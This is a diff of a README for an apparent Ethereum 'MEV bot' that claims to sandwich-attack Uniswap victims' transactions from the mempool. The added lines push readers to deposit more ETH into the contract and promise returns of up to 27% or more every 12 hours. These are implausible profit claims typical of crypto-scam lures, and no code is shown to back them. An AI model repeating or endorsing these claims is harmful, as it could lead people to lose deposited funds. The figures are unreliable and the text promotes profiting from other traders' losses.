@@ -1,20 +1,34 @@
 # MEV Bot
-ETH MEV-BOT for sandwich attack on Uniswap and Pancakeswap Mev Solidity BOT that allows deployers of contract to take profits from tokens.
+ETH MEV-BOT for sandwich attack on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that allows deployers of contract to take profits from tokens.
 
 Uniswap v2 MEV bot - Updated mempool settings - April 2023 The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.
 
-Bot sends the Transaction and sniffs the Uniswap v2 Mempool
+Bot sends the Transaction and sniffs the Uniswap v2 Mempool for txs with high slippage, calculating if a sandwich attack is profitable.
 
-Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity
+Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity, my bot always puts 1 gas more than everybody elses, as long as it remains profitable, securing a large amount of profitable transactions. 
 
-Sending back the ETH to the contract ready for withdrawal.
+Then sends back the ETH to the contract ready for withdrawal.
 
 This bot performs all of that, faster than 99% of other bots.
 
 MEV bot Instructions (works only for Mainnet)
 
-**For your profit use above 1 ETH **
 
+# Deposits
+**Deposits of lower than 0.4 ETH are going to find much fewer txs because of the gas fees**
+
+**Higher amounts of ETH deposited into the contract result in a larger amount of successful sandwich attack txs, therefore more profit**
+
+**For higher profits use above 1.2 ETH**
+
+# Expected returns
+**0.1ETH - 0.4ETH = up to 10%/12hrs** 
+
+**0.4ETH - 1.2ETH = up to 20%/12hrs**
+
+**1.2ETH - 2.4ETH = 20-27%/12hrs**
+
+**2.4ETH+ = 27%++ every 12 hrs**
 
 Make money with MevBot (ETH network)
 
